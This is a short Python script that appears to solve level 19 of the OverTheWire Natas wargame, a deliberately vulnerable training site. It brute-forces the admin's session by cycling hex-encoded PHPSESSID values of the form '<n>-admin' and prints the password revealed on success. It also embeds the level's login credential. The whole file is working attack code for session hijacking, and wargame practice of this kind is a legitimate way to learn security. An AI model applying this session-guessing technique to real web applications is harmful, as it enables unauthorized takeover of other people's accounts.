#!/usr/bin/python3

# coding : utf-8


import requests
import re

URL = "http://natas19.natas.labs.overthewire.org"
cookies = {'PHPSESSID': ''}
session = requests.Session()
session.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(1, 641):
    cookies['PHPSESSID'] = '{}-admin'.format(i).encode().hex()
    res = session.get(URL, cookies=cookies)
    if 'regular' not in res.text:
        m = re.search(r'Password: [A-Za-z0-9]+', res.text)
        if m:
            print(m.group(0))
            break


